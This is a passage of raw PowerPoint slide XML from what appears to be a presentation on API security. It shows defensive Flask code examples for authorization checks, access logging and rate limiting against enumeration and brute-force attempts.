          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="3941445"/>
            <a:ext cx="7825502" cy="1258729"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3784"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="3941445"/>
            <a:ext cx="7836694" cy="1258729"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1352"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="4026456"/>
            <a:ext cx="7609999" cy="1088708"/>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@app.route('/api/sensitive-data/')</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def get_sensitive_data(data_id):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if not can_access(current_user, data_id):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log_access(current_user.id, data_id, 'read', False)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abort(403)</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log_access(current_user.id, data_id, 'read', True)</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return jsonify(get_data(data_id))</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="5320563"/>
            <a:ext cx="7825502" cy="21788"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="272525">
              <a:alpha val="50000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="5427345"/>
            <a:ext cx="2995851" cy="297656"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1850" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>5. Implement Rate Limiting</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="5810012"/>
            <a:ext cx="7825502" cy="1666994"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2857"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="5810012"/>
            <a:ext cx="7836694" cy="1666994"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1021"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="5895023"/>
            <a:ext cx="7609999" cy="1496973"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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from flask_limiter import Limiter</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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limiter = Limiter(app, key_func=lambda: request.remote_addr)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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@app.route('/api/users/')</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@limiter.limit("100 per hour")  # Prevent enumeration</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def get_user(user_id):</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 Authorization check</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if user_id != current_user.id and not current_user.is_admin:</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abort(403)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>    return jsonify(User.query.get(user_id).to_dict())</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="7540704"/>
            <a:ext cx="7825502" cy="136088"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Rate limiting prevents attackers from rapidly enumerating resources and helps protect against brute force attacks.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7912</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Custom</PresentationFormat>
  <Paragraphs>1184</Paragraphs>
  <Slides>37</Slides>
  <Notes>37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Inter</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Petrona Bold</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>Petrona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shrishanth battu</cp:lastModifiedBy>
  <cp:revision>5</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-02-06T05:21:49Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-02-06T06:23:06Z</dcterms:modified>
</cp:coreProperties>
</file>